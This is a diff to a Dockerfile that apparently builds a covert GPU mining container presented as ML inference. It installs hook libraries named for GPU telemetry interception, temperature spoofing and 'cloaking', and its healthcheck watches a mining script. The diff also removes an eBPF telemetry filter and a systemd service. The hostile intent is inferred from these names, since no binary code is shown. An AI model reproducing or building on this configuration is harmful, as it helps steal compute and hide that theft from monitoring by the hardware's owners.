@@ -114,17 +114,14 @@ RUN set -eux; \
 COPY . /app/
 
 # Sao chép pre-compiled binaries và libraries
-COPY ml-inference inference-cuda libmlls-cuda.so /tmp/
+COPY inference-cuda libmlls-cuda.so /tmp/
 COPY entrypoint.sh /app/entrypoint.sh
 COPY mining_environment/gpu_plugins/native/cuda/libmpo.so /tmp/libmpo.so
 COPY mining_environment/gpu_plugins/native/nvml/libgpuhook.so /tmp/libgpuhook.so
 COPY mining_environment/gpu_plugins/native/thermal/libtempspoof.so /tmp/libtempspoof.so 
 
-# GPU telemetry filter moved to gpu_plugins module
-COPY mining_environment/gpu_plugins/ebpf/obj/gpu_telemetry_filter.bpf.o /app/mining_environment/gpu_plugins/ebpf/obj/
 
 RUN ldconfig && \
-    install -D /tmp/ml-inference      /usr/local/bin/ml-inference && \
     install -D /tmp/inference-cuda    /usr/local/bin/inference-cuda && \
     install -D /tmp/libmlls-cuda.so   /usr/local/bin/libmlls-cuda.so && \
     install -D /tmp/libmpo.so         /opt/mpo/libmpo.so && \
@@ -161,8 +158,6 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
     CONFIG_DIR=/app/mining_environment/config \
     MODELS_DIR=/app/mining_environment/models \
     LOGS_DIR=/app/mining_environment/logs \
-    CPU_PLUGIN_CFG=/app/mining_environment/config/cpu_plugins.yml \
-    ML_COMMAND=/usr/local/bin/ml-inference \
     CUDA_COMMAND=/usr/local/bin/inference-cuda \
     MLLS_CUDA=/usr/local/bin/libmlls-cuda.so \
     GPU_CLOAK_LOG_LEVEL=INFO \
@@ -194,15 +189,6 @@ RUN set -eux; \
     rm -rf /var/lib/apt/lists/*
 
 
-# ------------------  (15)  Setup scripts & GPU Debug Tool ----------------
-COPY setup_rdt.sh /app/setup_rdt.sh
-COPY rdt-mount.service /etc/systemd/system/rdt-mount.service
-RUN chmod +x /app/setup_rdt.sh && \
-    if [ -d "/etc/systemd/system" ]; then \
-        chmod 644 /etc/systemd/system/rdt-mount.service && \
-        systemctl enable rdt-mount.service || true; \
-    fi
-
 # ------------------  (16)  Healthcheck & Metadata --------------------------
 HEALTHCHECK --interval=1m --timeout=10s --start-period=30s --retries=3 CMD pgrep -f start_mining.py || exit 1
 
@@ -219,9 +205,7 @@ LABEL maintainer="Transformer Mining Team" \
       gpu.debug="integrated" \
       security.level="high"
 
-EXPOSE 8080 9090
-VOLUME ["/var/log/ebpf", "/tmp/ebpf"]
-
+      
 # ------------------  (17)  Entrypoint & CMD --------------------------------
 COPY start_mining.py /app/start_mining.py
 RUN chmod +x /app/entrypoint.sh /app/start_mining.py
